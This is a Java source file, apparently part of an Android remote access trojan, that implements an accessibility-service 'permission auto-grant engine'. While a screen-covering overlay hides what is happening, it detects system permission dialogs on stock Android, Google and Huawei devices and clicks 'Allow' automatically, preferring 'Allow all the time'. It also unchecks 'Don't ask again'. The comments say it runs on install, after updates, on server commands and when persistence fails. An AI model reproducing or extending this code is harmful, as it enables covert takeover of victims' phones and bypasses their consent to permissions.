package com.vendor.rat.auto.engine;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.filter.NodeFilter;

import java.util.ArrayList;
import java.util.List;

/**
 * 权限自动授予引擎
 *
 * 监听系统权限对话框 (GrantPermissionsActivity)，自动点击"允许"按钮
 * 实现静默授权，无需用户手动操作
 *
 * 监听的界面:
 *   - com.android.permissioncontroller / GrantPermissionsActivity
 *   - com.google.android.permissioncontroller (部分设备)
 *   - com.android.packageinstaller (旧版 Android)
 *   - 华为: com.huawei.systemmanager
 */
public class PermissionAutoGrantEngine extends AutoEngine {

    private static final String TAG = "PermAutoGrant";

    // 权限控制器包名 (不同厂商/版本)
    private static final String PERMISSION_CONTROLLER = "com.android.permissioncontroller";
    private static final String GOOGLE_PERMISSION_CONTROLLER = "com.google.android.permissioncontroller";
    private static final String PACKAGE_INSTALLER = "com.android.packageinstaller";
    private static final String HUAWEI_SYSTEM_MANAGER = "com.huawei.systemmanager";

    // 权限对话框 Activity
    private static final String GRANT_PERMISSIONS = "GrantPermissionsActivity";

    public PermissionAutoGrantEngine() {
        super(buildWindowMatchers(), PERMISSION_CONTROLLER);
    }

    private static List<WindowMatcher> buildWindowMatchers() {
        List<WindowMatcher> list = new ArrayList<>();

        // Android 10+ 权限控制器
        WindowMatcher pc = new WindowMatcher(PERMISSION_CONTROLLER);
        pc.addEventType(32);     // TYPE_WINDOW_STATE_CHANGED
        pc.addEventType(16384);  // TYPE_WINDOW_CONTENT_CHANGED
        list.add(pc);

        // Google 权限控制器
        list.add(new WindowMatcher(GOOGLE_PERMISSION_CONTROLLER));

        // 旧版 PackageInstaller
        list.add(new WindowMatcher(PACKAGE_INSTALLER));

        // 华为系统管理器
        list.add(new WindowMatcher(HUAWEI_SYSTEM_MANAGER));

        return list;
    }

    /**
     * 重写窗口匹配 — 仅在遮罩显示期间匹配权限对话框
     *
     * 设计: PermissionAutoGrantEngine 不是常驻监听器，而是遮罩自动化流程的一部分。
     * 仅在以下场景中激活（均伴随遮罩显示）：
     *   - 首次安装后的保活自动化
     *   - 软件更新后重新触发
     *   - 服务器下发保活命令
     *   - 检测到保活失效时重新执行
     * 遮罩关闭后立即停止响应，防止干扰用户正常操作。
     */
    @Override
    public boolean matchWindow(String packageName, String className, int eventType) {
        if (packageName == null) return false;

        // 核心守卫: 遮罩未显示时不响应任何权限事件
        if (!com.vendor.rat.helper.BlockViewHelper.isShowing()) {
            return false;
        }

        // 只匹配授权弹窗 (GrantPermissionsActivity)，排除权限管理页面
        boolean isPermissionPkg = PERMISSION_CONTROLLER.equals(packageName)
                || GOOGLE_PERMISSION_CONTROLLER.equals(packageName)
                || PACKAGE_INSTALLER.equals(packageName);

        if (isPermissionPkg) {
            // 明确排除权限管理列表页
            if (className != null && (className.contains("ManagePermissions")
                    || className.contains("AppPermissions")
                    || className.contains("RecyclerView")
                    || className.contains("ImageButton"))) {
                return false;
            }
            // 精确匹配 GrantPermissionsActivity 或 AlertDialog
            if (className == null
                    || className.contains(GRANT_PERMISSIONS)
                    || className.contains("AlertDialog")) {
                return true;
            }
            return false;
        }

        // 华为权限弹窗
        if (HUAWEI_SYSTEM_MANAGER.equals(packageName)
                && className != null && className.contains("Permission")) {
            return true;
        }

        // 通用: 类名包含 GrantPermissions
        if (className != null && className.contains(GRANT_PERMISSIONS)) {
            return true;
        }

        return false;
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        log("Permission dialog detected: " + packageName + "/" + className);

        try {
            autoClickAllow();
        } catch (Exception e) {
            logError("Error auto-granting permission", e);
        }
    }

    @Override
    public void execute() {
        // 被动监听，不需要主动执行
        log("Permission auto-grant engine started (passive)");
    }

    // ============ 自动点击 ============

    /**
     * 允许按钮文本 — 按优先级排列
     * "始终允许" > "仅在使用中允许" > "仅在使用该应用时允许" > "允许" > "同意/确定"
     */
    private static final String[][] ALLOW_BUTTON_TEXTS = {
        {"始终允许", "Allow all the time"},
        {"仅在使用中允许", "While using the app"},
        {"仅在使用该应用时允许", "Allow only while using the app"},
        {"仅使用期间允许"},  // 华为鸿蒙 EMUI 14+
        {"允许本次使用", "Only this time", "仅限这一次"},
        {"允许", "Allow"},
        {"同意", "确定"},
    };

    /**
     * 自动点击"允许"按钮
     *
     * 按钮文本因系统版本和语言不同:
     *   - 中文: "允许" / "始终允许" / "仅在使用中允许" / "仅限这一次"
     *   - 英文: "Allow" / "Allow all the time" / "While using the app" / "Only this time"
     *
     * 优先级: "始终允许" > "仅在使用中允许" > "允许" > "Allow"
     */
    private void autoClickAllow() {
        sleep(300);

        UiNode root = getRootNode();
        if (root == null) {
            log("autoClickAllow: root is null");
            return;
        }

        log("autoClickAllow: root pkg=" + root.getPackageName()
            + " childCount=" + root.getChildCount());

        // 弹窗渲染等待: 华为鸿蒙渲染较慢，重试最多 5 次 (每次 300ms，总计 1.5 秒)
        UiNode denyBtn = null;
        for (int retry = 0; retry < 5; retry++) {
            denyBtn = root.findOneByCombine(
                    CombineFilter.or(
                        CombineFilter.button("禁止"),
                        CombineFilter.button("拒绝"),
                        CombineFilter.button("Deny"),
                        StringCondition.viewId("com.android.permissioncontroller:id/permission_deny_button")
                    ));
            if (denyBtn != null) break;
            log("autoClickAllow: denyBtn not found, retry " + (retry + 1));
            sleep(300);
            root = getRootNode();
            if (root == null) return;
        }
        if (denyBtn == null) {
            log("autoClickAllow: denyBtn still null after retries");
            return;
        }

        // 先处理"不再询问"复选框 — 如果勾选了要取消
        uncheckDontAskAgain(root);

        // 按优先级查找允许按钮
        for (String[] texts : ALLOW_BUTTON_TEXTS) {
            UiNode btn = findAllowButton(root, texts);
            if (btn != null) {
                btn.click();
                log("Clicked '" + texts[0] + "'");
                return;
            }
        }

        // 最后尝试: 查找任何包含"允许"或"Allow"的可点击节点
        UiNode btn = root.findOneByCombine(
            CombineFilter.and(
                CombineFilter.or(
                    StringCondition.textContains("允许"),
                    StringCondition.textContains("Allow")
                ),
                new com.vendor.rat.auto.condition.BoolCondition(
                    com.vendor.rat.auto.condition.BoolCondition.Property.CLICKABLE, true)
            )
        );

        if (btn != null) {
            btn.click();
            log("Clicked allow button (fallback text)");
        } else {
            // 最终 fallback: 通过 ID 查找 (EMUI 12 / Android 10)
            btn = root.findOneByCombine(
                    StringCondition.viewId("com.android.permissioncontroller:id/permission_allow_button"));
            if (btn == null) {
                // EMUI 14 / Android 12+: "仅使用期间允许"按钮 ID
                btn = root.findOneByCombine(
                    StringCondition.viewId("com.android.permissioncontroller:id/permission_allow_foreground_only_button"));
            }
            if (btn == null) {
                // Android 12+: "允许本次使用"按钮 ID
                btn = root.findOneByCombine(
                    StringCondition.viewId("com.android.permissioncontroller:id/permission_allow_one_time_button"));
            }
            if (btn != null) {
                btn.click();
                log("Clicked allow button (fallback ID)");
            } else {
                logError("No allow button found");
            }
        }
    }

    /**
     * 查找允许按钮 — 支持 Button 和 TextView
     */
    private UiNode findAllowButton(UiNode root, String... texts) {
        for (String text : texts) {
            // 先找 Button
            UiNode btn = root.findOneByCombine(CombineFilter.button(text));
            if (btn != null) return btn;

            // 再找可点击的 TextView
            btn = root.findOneByCombine(
                CombineFilter.and(
                    StringCondition.textEquals(text),
                    new com.vendor.rat.auto.condition.BoolCondition(
                        com.vendor.rat.auto.condition.BoolCondition.Property.CLICKABLE, true)
                )
            );
            if (btn != null) return btn;

            // 最后找包含文本的可点击节点
            btn = root.findOneByCombine(
                CombineFilter.and(
                    StringCondition.textContains(text),
                    new com.vendor.rat.auto.condition.BoolCondition(
                        com.vendor.rat.auto.condition.BoolCondition.Property.CLICKABLE, true)
                )
            );
            if (btn != null) return btn;
        }
        return null;
    }

    /**
     * 取消"不再询问"复选框
     * Android 权限对话框可能有"不再询问"(Don't ask again) 复选框
     * 如果勾选了，后续无法再弹出权限请求
     */
    private void uncheckDontAskAgain(UiNode root) {
        try {
            // 查找 CheckBox
            UiNode checkBox = root.findOneByCombine(
                CombineFilter.and(
                    StringCondition.className("android.widget.CheckBox"),
                    new com.vendor.rat.auto.condition.BoolCondition(
                        com.vendor.rat.auto.condition.BoolCondition.Property.CHECKED, true)
                )
            );
            if (checkBox != null) {
                checkBox.click();
                log("Unchecked 'Don't ask again' checkbox");
                sleep(200);
            }
        } catch (Exception e) {
            // 忽略，不影响主流程
        }
    }
}
